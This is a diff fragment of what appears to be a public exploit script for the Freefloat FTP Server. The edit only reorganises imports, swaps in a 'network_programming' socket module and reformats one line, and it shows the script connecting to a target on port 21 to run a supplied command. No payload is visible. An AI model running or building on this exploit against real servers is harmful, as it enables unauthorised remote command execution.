@@ -7,7 +7,10 @@
 #Vendor Notified: 7-18-2011 (no response)
 #Software Link: http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php
 
-import socket,sys,time,struct
+import struct
+import sys
+import time
+from network_programming import socket
 
 if len(sys.argv) < 2:
      print "[-]Usage: %s <target addr> <command>" % sys.argv[0] + "\r"
@@ -62,7 +65,7 @@ print "\
 [*] Author: Craig Freyman (@cd1zz)\n\
 [*] Connecting to "+target
 
-s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
     s.connect((target,21))
 except:
